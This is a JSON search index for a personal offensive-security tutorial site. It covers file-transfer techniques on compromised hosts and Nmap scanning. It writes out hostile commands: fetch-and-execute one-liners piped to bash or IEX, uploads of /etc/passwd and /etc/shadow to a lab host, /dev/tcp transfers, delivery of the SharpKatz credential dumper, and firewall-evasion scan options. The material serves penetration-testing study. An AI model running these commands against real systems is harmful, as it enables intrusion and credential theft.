{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to the Red Parrot Docs","text":"<p> \"We will never be able to fix what we don't know is brok3n.\"</p> <p>Hello and Welcome!  Though I'm a red parrot but my human name is - Jayant Kumawat. I'm crazy about computers, web applications, networks, operating systems and specially cyber security which is a combination of everything. This is where everything clicks together, being the reason of my love towars information security. This ever lasting passion and a bolster dedication starts from creating simple web applications to creating CTF's. I've decided to create the red parrot docs to contribute my knowledge and skills to the infosec community. </p> <p> The more I know, feels like how little I know.</p>"},{"location":"community/","title":"Together we hit hard","text":"<p>Software development is overhyped. If you believe so, then join me in this wonderful journey where we all create an impact. We will create our own payloads, exploits and tools that will be used worldwide. At Red Parrot Docs, you will get anything you aspire for in the field of cybersecurity.</p>"},{"location":"cybernews/","title":"You'll get the lastest news about digital threats.","text":""},{"location":"school/tiers/filetransfers/","title":"File Transfers","text":""},{"location":"school/tiers/filetransfers/#file-transfer-methods","title":"File Transfer Methods","text":""},{"location":"school/tiers/filetransfers/#windows-file-transfer-methods","title":"Windows File Transfer Methods","text":""},{"location":"school/tiers/filetransfers/#downloading-files-from-linux-to-windows","title":"Downloading files from Linux to Windows","text":"<p><code>Via base64 encode-decode method</code> <pre><code>cat ~/.ssh/id_rsa | base64 -w 0 | xclip -selection clipboard\n</code></pre></p> <pre><code>PS C:\\Users&gt; [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(&lt;BASE64_ENCODED_CONTENTS_OF_A_FILE&gt;))\nPS C:\\Users&gt; Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5\n</code></pre> <p><code>Via SMB share</code> <pre><code>sudo impacket-smbserver share -smb2support file-transfer -user redparrot -password toor\n\n\nxfreerdp /u:&lt;username&gt; /p:'&lt;password&gt;' /v:&lt;RDP_SERVER&gt;\nC:\\Users\\ghost&gt; net use n: \\\\&lt;TUN0_IP&gt;\\share /user:redparrot toor\nC:\\Users\\ghost&gt; net copy n:\\file.zip\nC:\\Users\\ghost&gt; powershell\nPS C:\\Users\\ghost&gt; Expand-Archive -Path yourfile.zip -DestinationPath .\nPowerShell&gt; cd N:\nPS N:&gt; hasher file.txt &gt; hash.txt \nPS N:&gt; exit\n\n# unmount the share N from windows, exit from RDP, stop sharing the share via SMB\n# Navigate to the share and get hash.txt\n</code></pre></p> <p><code>PowerShell Web Downloads</code></p> <pre><code>PS C:\\Users&gt; # Example: (New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\nPS C:\\Users&gt; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n\nPS C:\\Users&gt; # Example: (New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\nPS C:\\Users&gt; (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\\Users\\Public\\Downloads\\PowerViewAsync.ps1')\n</code></pre> <p><code>PowerShell Invoke-WebRequest</code> <pre><code>PS C:\\Users&gt; Invoke-WebRequest https://192.168.45.2/PowerView.ps1 -UseBasicParsing | IEX\n\n# Disable SSL/TLS secure channel\nPS C:\\Users&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\nPS C:\\Users&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\n</code></pre></p> <p><code>FTP Downloads</code> <pre><code>redparrot@parrot~$ sudo python3 -m pyftpdlib --port 21\n</code></pre></p> <pre><code>PS C:\\Users&gt; (New-Object Net.WebClient).DownloadFile('ftp://&lt;FTP_SERVER_IP&gt;/file.txt', 'C:\\Users\\Public\\ftp-file.txt')\n</code></pre> <p>Create a Command File for the FTP Client and Download the Target File. Helpful in scenarios where we don't have an interactive shell in the remote server. <pre><code>C:\\Users&gt; echo open &lt;FTP_SERVER_IP&gt; &gt; ftpcommand.txt\nC:\\Users&gt; echo USER anonymous &gt;&gt; ftpcommand.txt\nC:\\Users&gt; echo binary &gt;&gt; ftpcommand.txt\nC:\\Users&gt; echo GET file.txt &gt;&gt; ftpcommand.txt\nC:\\Users&gt; echo bye &gt;&gt; ftpcommand.txt\nC:\\Users&gt; ftp -v -n -s:ftpcommand.txt\nftp&gt; open &lt;FTP_SERVER_IP&gt;\nLog in with USER and PASS first.\nftp&gt; USER anonymous\n\nftp&gt; GET file.txt\nftp&gt; bye\n\nC:\\Users&gt;more file.txt\nThis is a test file\n</code></pre></p>"},{"location":"school/tiers/filetransfers/#uploading-files-from-windows-to-linux","title":"Uploading files from Windows to Linux","text":"<p><code>PowerShell Base64 Encode &amp; Decode</code> <pre><code># Base64 encode the /etc/hosts file using powershell\nPS C:\\Users&gt; [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\n\n&lt;BASE_64_ENCODED_CONTENTS_OF_FILE&gt;\nPS C:\\Users&gt; Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash\n\nHash\n----\n4388374325B992DEF12793500307AA34\n\n# Decode the string in linux\necho \"&lt;BASE_64_ENCODED_CONTENTS_OF_FILE&gt;\" | base64 -d; xclip -selection clipboard\n</code></pre></p> <p><code>PowerShell Web Uploads</code> <pre><code>python3 -m uploadserver 8080\n</code></pre></p> <pre><code># Upload the file to python upload server running on Linux\nPS C:\\Users&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nPS C:\\Users&gt; Invoke-FileUpload -Uri http://192.168.49.128:8080/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n\n[+] File Uploaded:  C:\\Windows\\System32\\drivers\\etc\\hosts\n[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373\n</code></pre> <p><code>PowerShell Base64 Web Upload</code> <pre><code>PS C:\\Users&gt; $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nPS C:\\Users&gt; Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64\n\n# In the linux VM\nredparrot@parrot~$ nc -lvnp 8000\n\n# catch the base64 encoded data and decode it in linux\nredparrot@parrot~$ echo &lt;base64&gt; | base64 -d -w 0 &gt; hosts\n</code></pre></p> <p><code>SMB Uploads</code> <pre><code>redparrot@parrot~$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous \n</code></pre></p> <pre><code># Connecting to the Webdav Share from Windows\nC:\\Users&gt; dir \\\\192.168.49.128\\DavWWWRoot\n\n Volume in drive \\\\192.168.49.128\\DavWWWRoot has no label.\n Volume Serial Number is 0000-0000\n\n Directory of \\\\192.168.49.128\\DavWWWRoot\n\n05/18/2022  10:05 AM    &lt;DIR&gt;          .\n05/18/2022  10:05 AM    &lt;DIR&gt;          ..\n05/18/2022  10:05 AM    &lt;DIR&gt;          sharefolder\n05/18/2022  10:05 AM                13 filetest.txt\n               1 File(s)             13 bytes\n               3 Dir(s)  43,443,318,784 bytes free\n</code></pre> <p><code>Uploading Files using SMB</code> <pre><code>C:\\Users&gt; copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\\nC:\\Users&gt; copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\\n</code></pre></p> <p><code>FTP Uploads</code></p> <pre><code>redparrot@parrot~$ sudo python3 -m pyftpdlib --port 21 --write\n</code></pre> <pre><code>PS C:\\htb&gt; (New-Object Net.WebClient).UploadFile('ftp://&lt;FTP_SERVER_IP&gt;/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')\n</code></pre>"},{"location":"school/tiers/filetransfers/#linux-file-transfer-methods","title":"Linux File Transfer Methods","text":""},{"location":"school/tiers/filetransfers/#downloading-files-from-remote-host-to-linux","title":"Downloading files from remote host to Linux","text":"<p><code>Web Downloads with Wget and cURL</code></p> <pre><code>wget &lt;URL&gt; -O /path/to/file.ext\n</code></pre> <pre><code>curl -o /path/to/file.ext &lt;URL&gt;\n</code></pre> <p><code>Fileless downloads</code></p> <pre><code>curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash\n</code></pre> <pre><code>wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3\n</code></pre> <p><code>Download with Bash (/dev/tcp)</code> There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.</p> <pre><code>exec 3&lt;&gt;/dev/tcp/10.10.10.32/80\necho -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\"&gt;&amp;3\ncat &lt;&amp;3\n</code></pre> <p><code>SSH Downloads</code> <pre><code>sudo systemctl enable ssh\nsudo systemctl start ssh\nnetstat -lnpt\nscp plaintext@192.168.49.128:/root/myroot.txt . \n</code></pre></p>"},{"location":"school/tiers/filetransfers/#uploading-files-from-remote-host-to-linux","title":"Uploading files from remote host to Linux","text":"<p><code>Web Upload</code> Setting up a python upload server with SSL/TLS enabled.</p> <pre><code>openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\nmkdir https &amp;&amp; cd https\npython3 -m uploadserver 443 --server-certificate ~/server.pem\n</code></pre> <p><code>Linux - Upload Multiple Files</code></p> <pre><code>curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure\n</code></pre> <p><code>Linux - Creating a Web Server with Python3</code></p> <pre><code>python3 -m http.server 9001\n</code></pre> <p><code>Linux - Creating a Web Server with Python2.7</code></p> <pre><code>python2.7 -m SimpleHTTPServer\n</code></pre> <p><code>Linux - Creating a Web Server with PHP</code></p> <pre><code>php -S 0.0.0.0:9000\n</code></pre> <p><code>Linux - Creating a Web Server with Ruby</code></p> <pre><code>ruby -run -ehttpd . -p8000\n</code></pre> <p><code>Linux - Uploding and downloading files via SCP</code> Download a file from remote host via SSH key</p> <pre><code>scp -i ~/.ssh/secret_key username@&lt;DNS/IP&gt;:/home/redparrot/downloadme.txt /tmp/downloaded.txt\n</code></pre> <p>Upload a file from remote host via SSH key <pre><code>scp -i ~/.ssh/secret_key /tmp/uploadme.txt username@&lt;DNS/IP&gt;:/home/redparrot/uploaded.txt\n</code></pre></p> <p>Via password based authentication <pre><code>scp /etc/passwd redparrot@10.129.86.90:/home/redparrot/\n</code></pre></p>"},{"location":"school/tiers/filetransfers/#transferring-files-with-code","title":"Transferring Files with Code","text":"<p>File download - <code>Python3</code></p> <pre><code>python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n</code></pre> <pre><code>php -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'\n</code></pre> <p><pre><code>php -r 'const BUFFER = 1024; $fremote = \nfopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'\n</code></pre> Fileless download - <code>PHP</code></p> <pre><code>php -r '$lines = @file(\"&lt;URL_TO_CODE&gt;\"); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash\n</code></pre> <p>File download - <code>Ruby</code></p> <pre><code>ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))'\n</code></pre> <p>File download - <code>Perl</code></p> <p><pre><code>perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");'\n</code></pre> File download - <code>JavaScript</code></p> <pre><code>var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));\n</code></pre> <p>File download - <code>JavaScript &amp; cscript</code> <pre><code>cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1\n</code></pre></p> <p>File download - <code>VBScript</code> <code>wget.vbs</code></p> <pre><code>dim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n</code></pre> <p>We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file. <pre><code>C:\\Users&gt; cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1\n</code></pre></p> <p><code>Upload Operations using Python3</code> <pre><code>python3 -m uploadserver 9001\n</code></pre></p> <pre><code>python3 -c 'import requests;requests.post(\"http://192.168.49.128:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'\n</code></pre>"},{"location":"school/tiers/filetransfers/#miscellaneous-file-transfer-methods","title":"Miscellaneous File Transfer Methods","text":""},{"location":"school/tiers/filetransfers/#netcat","title":"NetCat","text":"<p>Compromised Machine - Listening on Port 9000</p> <pre><code>nc -l -p 9000 &gt; SharpKatz.exe\n</code></pre> <p>Attack Host - Sending File to Compromised machine <pre><code>redparrot@parrot$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe\nredparrot@parrot$ # Example using Original Netcat\nr3dp4rrot@htb[/htb]$ nc -q 0 &lt;ATTACKER'S_MACHINE&gt; 9000 &lt; SharpKatz.exe\n</code></pre></p> <p>The option <code>-q 0</code> will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.  </p> <p>Attack Host - Sending File as Input to Netcat <pre><code>sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe\n</code></pre></p> <p>Compromised Machine Connect to Netcat to Receive the File <pre><code>nc 192.168.49.128 443 &gt; SharpKatz.exe\n</code></pre></p>"},{"location":"school/tiers/filetransfers/#ncat","title":"Ncat","text":"<p>Compromised Machine - Listening on Port 9000. <pre><code>ncat -l -p 9000 --recv-only &gt; SharpKatz.exe\n</code></pre></p> <p>Attack Host - Sending File to Compromised machine. <pre><code>ncat --send-only 192.168.49.128 9000 &lt; SharpKatz.exe\n</code></pre></p> <p>Attack Host - Sending File as Input to Netcat <pre><code>sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe\n</code></pre></p> <p>Compromised Machine Connect to Netcat to Receive the File <pre><code>ncat 192.168.49.128 443 --recv-only &gt; SharpKatz.exe\n</code></pre></p>"},{"location":"school/tiers/filetransfers/#devtcp","title":"/dev/tcp","text":"<p>If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file <code>/dev/TCP/</code>. Writing to this particular file makes Bash open a TCP connection to host:port, and this feature may be used for file transfers.</p> <p>Compromised Machine Connecting to Netcat Using <code>/dev/tcp</code> to Receive the File <pre><code>cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe\n</code></pre></p>"},{"location":"school/tiers/filetransfers/#powershell-remoting","title":"Powershell remoting","text":"<p>Useful for scenarios where HTTP, HTTPS, or SMB are unavailable. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.  </p> <p>Test the connection to computer DATABASE01 <pre><code>Test-NetConnection -ComputerName DATABASE01 -Port 5985\nComputerName     : DATABASE01\nRemoteAddress    : 192.168.1.101\nRemotePort       : 5985\nInterfaceAlias   : Ethernet0\nSourceAddress    : 192.168.1.100\nTcpTestSucceeded : True\n</code></pre></p> <p>Create a PowerShell Remoting session to DATABASE01 <pre><code>$Session = New-PSSession -ComputerName DATABASE01\n</code></pre></p> <p>Copy samplefile.txt from our Localhost to the DATABASE01 Session <pre><code>Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\\n</code></pre></p> <p>Copy DATABASE.txt from DATABASE01 Session to our Localhost <pre><code>Copy-Item -Path \"C:\\Users\\Administrator\\Desktop\\DATABASE.txt\" -Destination C:\\ -FromSession $Session\n</code></pre></p>"},{"location":"school/tiers/filetransfers/#rdp","title":"RDP","text":"<p><code>rdesktop</code> or <code>xfreerdp</code> can be used to expose a local folder in the remote RDP session.</p> <p>Mounting a Linux Folder Using rdesktop <pre><code>rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'\n</code></pre></p> <p>Mounting a Linux Folder Using xfreerdp <pre><code>xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer\n</code></pre></p>"},{"location":"school/tiers/nmap/","title":"Nmap (Network mapper)","text":""},{"location":"school/tiers/nmap/#introduction","title":"Introduction","text":"<p>How does a TCP three-way handshake is established? When you want to talk to someone on the phone, you pick up the phone and dial the number, the receiver picks up the ringing phone not knowing who the caller is and says \u201cHello?,\u201d the original caller then introduces himself by saying \u201cHi, this is John!\u201d In response to this, the original receiver will often acknowledge the caller by saying \u201cOh, hi John!\u201d At this point both people have enough information for the conversation to continue as normal.</p> <p>Computers work much the same way. When two computers want to talk, they go through a similar process. The first computer connects to the second computer by sending a SYN packet to a specified port number. If the second computer is listening, it will respond with a SYN/ACK. When the first computer receives the SYN/ACK, it replies with an ACK packet. At this point, the two machines can communicate normally. In our phone example above, the original dialer is like sending the SYN packet. The receiver picking up the phone and saying \u201cHello?\u201d is like the SYN/ACK packet and the original caller introducing himself is like the ACK packet.</p> <p>Let's understand it with the help of an example: This is the scan report of a target network/host. <pre><code>PORT      STATE SERVICE     VERSION\n22/tcp    open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n80/tcp    open  http        Apache httpd 2.4.29 ((Ubuntu))\n110/tcp   open  pop3        Dovecot pop3d\n139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n143/tcp   open  imap        Dovecot imapd (Ubuntu)\n445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n31337/tcp open  Elite?\n</code></pre></p> <p>Let's say our machine wants to connect to port 445 via TCP. Before sending the connection request to the host, we would want to see all the incoming and outgoing network packets that will be exchanged between the target network and our machine. Listening for network traffic on specified hosts with tcpdump</p> <pre><code>sudo tcpdump -i wlan0 host &lt;TARGET_IP&gt; and &lt;DEV_MACHINE&gt;\n</code></pre> <p>Sending the connection request via netcat to PORT 445 which runs a netbios-ssn.  </p> <p></p> <p></p> <p>Understanding the network traffic Flags [S] - Network packet with a SYN flag set in the TCP headers. Flags [S.] - Network packet with a SYN-ACK flag set in the TCP headers. Flags [.] - Network packet with a ACK flag set in the TCP headers.  </p> <p>SYN - Synchronize ACK - Acknowledgement </p> <p>\"Enumeration is the key\" The default scan setting of nmap is a TCP-SYN scan (-sS). (scan speed ~ thousand ports/second).  The TCP-SYN scan sends one packet with the SYN flag and, therefore, never completes the three-way handshake, which results in not establishing a full TCP connection to the scanned port.</p> <p>Packet flow for a TCP-SYN scan: 1. nmap sends a TCP packet with a SYN flag to a port under scanning. 2. If the target sends a TCP packet with a ACK flag back to the port =&gt; open 3. If the target sends a TCP packet with a RST flag back to the port =&gt; closed 4. If the target drops the incoming packets =&gt; filtered and a strong firewall is in place.</p>"},{"location":"school/tiers/nmap/#handy-flags","title":"Handy Flags","text":"<p>Lets remember some of the most common flags passed to nmap.  </p> Flag Description -sS Default nmap scan, TCP-SYN -sT TCP Connect scan (stealthy for port scanning) -n Don't perform DNS lookups on the IP address, which makes the connection faster because it directly uses the provided IP address. -Pn Disable ICMP Echo requests -PE Enable ICMP Echo requests (Useful in host discovery) -sn Disable port scanning (Useful in host discovery) -p 21 Scan port 21 -p- Scan all ports -p 21-30 Scan port 21 to 30 -p 21,30 Scan port 21 AND 30 --disable-arp-ping Disable ARP Ping --packet-trace Trace the request and response packets -sV Version scan -oA Output in all formats --stats-every=5s Shows the progress of the scan every 5 seconds. -v/-vv Shows us the open ports directly when Nmap detects them"},{"location":"school/tiers/nmap/#discovering-hosts","title":"Discovering Hosts","text":"<p>Before we scan a single host for open ports and its services, we first have to determine if it is alive or not. For discovering hosts, we need to explicitly disable port scanning through -sn flag. If port scanning is disabled then by default ICMP Echo Requests are sent to the host. If the host is alive it will send an ICMP reply.</p> <pre><code>sudo nmap 10.10.14.24 -sn -oA host\n</code></pre>"},{"location":"school/tiers/nmap/#packet-trace","title":"Packet trace","text":"<p>-PE - Performs the ping scan by using 'ICMP Echo requests' against the target. --packet-trace - Tells nmap to trace the request and response packets.  <pre><code>sudo nmap 10.10.14.24 -sn -oA host -PE --packet-trace\n</code></pre></p>"},{"location":"school/tiers/nmap/#disable-arp-requests","title":"Disable ARP requests","text":"<p>--disable-arp-ping - Disables ARP requests and scan our target with the desired ICMP echo requests</p> <pre><code>sudo nmap 10.10.14.24 -sn -PE --disable-arp-ping -oA nmap/icmpscan\n</code></pre> <p>ICMP echo request can help us determine if our target is alive and identify its system.</p>"},{"location":"school/tiers/nmap/#hosts-and-port-scanning","title":"Hosts and Port Scanning","text":""},{"location":"school/tiers/nmap/#discovering-open-tcp-ports","title":"Discovering open TCP ports","text":"<p>-p 80, 445 - only scans port 80 and 445. --top-ports=10 -  top ports from the Nmap database that have been signed as most frequent. -p 80-443 - scan all the ports lying in range 80 to 443. -F - perform a fast scan by only scanning top 100 ports. -p- - scan all the ports.  </p>"},{"location":"school/tiers/nmap/#packet-analysis","title":"Packet Analysis","text":"<p>Let's scan port 443 via TCP-SYN scan. -Pn - Disable the ICMP Echo requests. -n - Disable DNS resolution. --packet-trace - Trace the packets. --disable-arp-ping - Disables ARP requests.  </p> <pre><code>sudo nmap 10.10.14.24 -p 443 --packet-trace -Pn -n --disable-arp-ping\n</code></pre>"},{"location":"school/tiers/nmap/#tcp-connect-scan","title":"TCP Connect Scan","text":"<p>The scan sends an SYN packet to the target port and waits for a response. It is considered open if the target port responds with an SYN-ACK packet and closed if it responds with an RST packet. The Connect scan is useful because it is the most accurate way to determine the state of a port, and it is also the most stealthy.  </p> <pre><code>sudo nmap 10.10.14.24 -p 80 --packet-trace --disable-arp-ping -Pn -n --reason -sT \n</code></pre>"},{"location":"school/tiers/nmap/#udp-port-scan","title":"UDP Port Scan","text":"<p>This will only scan top 100 ports. <pre><code>sudo nmap 10.10.14.24 -F -sU -oA nmap/udpscan\n</code></pre> To scan all the UDP ports: <pre><code>sudo nmap 10.10.14.24 -sU -oA nmap/alludpports\n</code></pre></p>"},{"location":"school/tiers/nmap/#documenting-the-results","title":"Documenting the results","text":"<p>When running nmap, get the nmap output in all formats via -oA flag. Once done, we can convert the <code>output.xml</code> file to <code>output.html</code> via <code>xsltproc</code>. <pre><code>xsltproc output.xml -o output.html\n</code></pre></p>"},{"location":"school/tiers/nmap/#manual-interation-with-a-service","title":"Manual Interation with a Service","text":"Question <p>Manually interact with all the ports and services</p> <p>First, scan the given host for all open ports and services.  </p> <p>Scan doesn't need to be always rigorous</p> <p>We're not forcing nmap to scan for all the ports (-p-), by default it will scan top ports.</p> <pre><code>sudo nmap 10.10.141.20 -sV --disable-arp-ping -Pn -n -oA nmap/services\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-08 12:25 UTC\nNmap scan report for 10.69.141.20\nHost is up (0.16s latency).\nNot shown: 993 closed tcp ports (reset)\nPORT      STATE SERVICE     VERSION\n22/tcp    open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n80/tcp    open  http        Apache httpd 2.4.29 ((Ubuntu))\n110/tcp   open  pop3        Dovecot pop3d\n139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n143/tcp   open  imap        Dovecot imapd (Ubuntu)\n445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n31337/tcp open  Elite?\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port31337-TCP:V=7.94SVN%I=7%D=6/8%Time=66644DDE%P=x86_64-pc-linux-gnu%r\nSF:(GetRequest,1F,\"220\\x20{Hello senior}\\r\\n\");\nService Info: Host: RP-DEFAULT; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 172.59 seconds \n</code></pre> <p>Setting up tcpdump to listen for incoming and outgoing network packets.</p> <p><pre><code>sudo tcpdump -i wlan0 host 10.10.20.14 and 10.69.141.20\n</code></pre> </p> <p>To interact with any port, we can use netcat to establish a connection with the port.</p> <p>nc - netcat -n - Disable DNS resolution (makes the connection faster) -v - Verbose (Tells about the connection details)</p> <p></p>"},{"location":"school/tiers/nmap/#nse","title":"NSE","text":"<p>Nmap's Scripting Engine(NSE) is a powerful feature of the Nmap network scanning tool that extends its capabilities by using scripts. These scripts can automate a wide range of tasks, from advanced version detection to vulnerability detection and exploitation. The scripts are written in the Lua programming language and can be found in the Nmap Scripting Engine's script repository.</p> <p>Using nmap's default scripts to scan the target network. <pre><code>sudo nmap 10.10.14.24 -sC\n</code></pre></p> <p>Using a specific script category <pre><code>sudo nmap 10.10.14.24 --script &lt;category&gt;\n</code></pre></p> <p>Using defined scripts <pre><code>sudo nmap &lt;target&gt; --script &lt;script-name&gt;,&lt;script-name&gt;,...\n</code></pre></p>"},{"location":"school/tiers/nmap/#aggressive-scan","title":"Aggressive Scan","text":"<p>-A - Performs service detection, OS detection, traceroute and uses defaults scripts to scan the target. Let's perform an aggressive scan on port 80 with nmap's default scripts.</p> <pre><code>sudo nmap 10.10.14.24 -p 80 -A \n</code></pre>"},{"location":"school/tiers/nmap/#performance","title":"Performance","text":"<p>Good but may miss some ports and hosts while scanning.</p>"},{"location":"school/tiers/nmap/#lab","title":"Lab","text":"<p>What happens if an IDS and IPS is in place? What happens if there is no chance of interacting with the host to discover open ports, services running on them?  </p> Quote <p>When the WAF says 'No', let your determination say 'Yes'. Every denial is just a disguised invitation to dig deeper</p>"},{"location":"school/tiers/nmap/#firewall-evasion-methods","title":"Firewall Evasion methods","text":"<p>METHOD-1 : The Decoy scanning method   -D - The Decoy scanning method Decoy scanning helps to mask the actual source of the scan by including additional IP addresses in the scan request. This can confuse the target system's logging and alerting mechanisms by making it appear as though the scan is coming from multiple sources rather than a single one. Decoys can be used for SYN, ACK, ICMP scans, and OS detection scans</p> <p>-D RND:4 - Generates four random IP addresses that indicates the source IP the connection comes from. METHOD-2 : TCP-ACK scan How TCP ACK Scanning(-sA) Works? Sending TCP ACK Packets: The scanner sends TCP packets with the ACK flag set to the target host. The ACK flag is used in the TCP protocol to acknowledge the receipt of packets. These packets are sent without establishing a connection (i.e., they are sent without the SYN flag). The packets with the ACK flag are often passed by the firewall because the firewall cannot determine whether the connection was first established from the external network or the internal network.</p> <p>Analyzing Responses:</p> <ul> <li> <p>No Response or ICMP Unreachable: If no response or an ICMP \"port unreachable\" message is received, it indicates that the port is either filtered (i.e., blocked by a firewall) or that the target is not reachable. </p> </li> <li> <p>RST Packet: If the target responds with a TCP RST (reset) packet, it suggests that the port is unfiltered, which means the firewall is allowing traffic through but there's no service listening on that port.</p> </li> </ul> <p>unfiltered - This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.  </p> <p>METHOD-3 : Scan by Using Different Source IP -S IP - Scan the host with the source IP as any IP address that lies in the same subnet.</p> <p>METHOD-3 : DNS Proxying The DNS queries are made over the UDP port 53. The TCP port 53 was previously only used for the so-called \"Zone transfers\" between the DNS servers or data transfer larger than 512 bytes. The company's DNS servers are usually more trusted than those from the Internet. So, for example, we could use them to interact with the hosts of the internal network. As another example, we can use TCP port 53 as a source port (--source-port) for our scans. If the administrator uses the firewall to control this port and does not filter IDS/IPS properly, our TCP packets will be trusted and passed through.</p> <p>--source-port 53 - Performs the scans from specified source port.</p>"},{"location":"school/tiers/nmap/#nmap-scrips","title":"Nmap scrips","text":"<p>Find all the nmap scripts that can be used for enumerating an FTP service. <pre><code>find / -type f -name ftp* 2&gt;/dev/null | grep scripts\n</code></pre></p>"},{"location":"school/tiers/os/","title":"Operating Systems","text":""},{"location":"school/tiers/os/#dual-boot","title":"Dual boot","text":"<p>Dual boot 101 Usually the host operating system is windows, let's say we want to install ParrotOS alongside. Installing parrot OS in dual boot with windows.</p> <p>Case study Laptop - DELL G5 15 SE Configuration - R7-4800H, 6GiB RX 5600M, 1TB + 512GB SSD 